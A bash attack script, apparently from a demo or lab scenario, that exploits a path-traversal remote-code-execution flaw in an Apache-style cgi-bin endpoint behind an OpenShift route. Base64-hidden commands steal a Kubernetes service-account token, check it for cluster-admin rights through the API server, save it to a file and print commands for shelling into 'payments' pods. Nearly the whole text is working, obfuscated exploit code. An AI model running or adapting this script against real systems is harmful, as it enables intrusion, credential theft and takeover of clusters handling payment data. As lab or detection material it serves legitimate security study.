#!/bin/bash

#attach visa deployment
export target=$(oc -n frontend get route/asset-cache --output jsonpath={.spec.host} 2>/dev/null)

inject=$(cat $(dirname -- "$0")/templates/attack_get_token.sh | base64)

function curl_target(){
curl -s "$1/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh" -d "echo Content-Type: text/plain; echo; $2"
}

function attack(){
export hostname=$(curl_target $1 "cat /etc/hostname")
echo $hostname | grep -q "<html>" && echo '☹ - Target not Vulnerable' && exit || echo "☺ - Target ${hostname} Exploited" && pivot $1 || echo '☹ - Exploit FAILED'
}

function pivot(){
echo "☺ - Next Phase: Lateral Movement ..."
echo "☺ - Exploiting visa-processor workload ..."
export target_info=$(curl_target $1 "echo '${inject}' | base64 -d | bash -")
export hostname_pivot=$(echo ${target_info} | cut -f 1 -d " ")
[ ! -z "${target_info}" ] && echo "☺ - Target ${hostname_pivot} Exploited" && echo "☺ - Token extracted from ${hostname_pivot}" && check_token_privileges $1 || echo '☹ - Exploit FAILED'
}

function check_token_privileges(){
export token=$(echo ${target_info} | awk 'NF>1{print $NF}')
commandb64='Y3VybCAtcyAtayAgXAogICAgIC1IICJDb250ZW50LXR5cGU6IGFwcGxpY2F0aW9uL2pzb24iIFwKICAgIC1IICJBdXRob3JpemF0aW9uOiBCZWFyZXIgJHt0b2tlbn0iIFwKICAgIC1kICd7ImtpbmQiOiJTZWxmU3ViamVjdEFjY2Vzc1JldmlldyIsImFwaVZlcnNpb24iOiJhdXRob3JpemF0aW9uLms4cy5pby92MSIsIm1ldGFkYXRhIjp7ImNyZWF0aW9uVGltZXN0YW1wIjpudWxsfSwic3BlYyI6eyJyZXNvdXJjZUF0dHJpYnV0ZXMiOnsidmVyYiI6IioiLCJyZXNvdXJjZSI6IioifX0sInN0YXR1cyI6eyJhbGxvd2VkIjpmYWxzZX19CicgXAogICAgaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjL2FwaXMvYXV0aG9yaXphdGlvbi5rOHMuaW8vdjEvc2VsZnN1YmplY3RhY2Nlc3NyZXZpZXdzCg=='
inject=$(echo ${commandb64} | base64 -d | envsubst | base64 )
curl_target $1 "echo '${inject}' | base64 -d | bash -" | grep -i -q 'allowed": true,' &&  echo $token > token && echo " ☣☣☣ Checking Token Privileges ☣☣☣" && echo ☺ - kubernetes.default.svc:443 Access Confirmed from ${hostname} && echo ☺ - Token with cluster-admin Privileges Confirmed && echo ☣☣☣ Happy Hacking ☣☣☣
if test -f token;then
echo ""
echo "Use the token to remote access the POD"
echo 'run: oc --token $(cat token) -n payments get pods'
echo 'run: oc --token $(cat token) -n payments rsh <POD NAME>'
fi
}

if [ -z "$target" ]
then
  echo  "try: $0 target:port"
  exit 1
fi

if [ ! -z "$target" ]
then
  attack $target
  exit 0
fi

attack $1
